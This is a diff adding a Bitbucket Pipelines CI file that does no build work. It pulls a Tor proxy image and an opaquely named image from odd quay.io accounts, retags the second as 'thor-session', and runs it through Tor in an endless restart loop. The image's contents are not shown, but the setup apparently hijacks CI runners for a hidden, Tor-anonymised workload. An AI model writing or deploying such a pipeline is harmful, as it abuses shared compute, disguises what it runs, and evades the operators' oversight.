@@ -1,0 +1,35 @@
+image: atlassian/default-image:3
+##
+#v3345
+pipelines:
+  default:
+    - step:
+        name: Pull and Run Docker Image
+        services:
+          - docker
+        script:
+          - docker network create tor-net
+          - docker pull quay.io/mylastres0rt05/tor-proxy:latest
+          - docker pull quay.io/mylastres0rt05_redhat/nova_dromidia:latest
+          - docker tag quay.io/mylastres0rt05/tor-proxy:latest tor-proxy
+          - docker tag quay.io/mylastres0rt05_redhat/nova_dromidia:latest thor-session:v1.44
+          - docker run -d --name tor-9050 --network tor-net -e SOCKS_PORT=9050 -e CONTROL_PORT=9051 -e API_PORT=5000 -p 9050:9050 -p 5000:5000 tor-proxy
+          - echo "Waiting for Tor to bootstrap..."
+          - until docker logs tor-9050 2>&1 | grep -q "Bootstrapped 100%"; do sleep 2; done
+          - echo "Tor bootstrapped! Starting session loop..."
+          - docker logs -f tor-9050 &
+          - |
+            while true; do
+              docker rm -f thor-session 2>/dev/null || true
+              docker run -d --name thor-session --network tor-net \
+                -e SOCKS_PORT=9050 -e API_PORT=5000 -e TOR_HOST=tor-9050 \
+                -p 8080:8080 thor-session:v1.44
+              docker logs -f thor-session
+              echo "Session exited, restarting..."
+              sleep 2
+            done
+
+definitions:
+  services:
+    docker:
+      memory: 3006
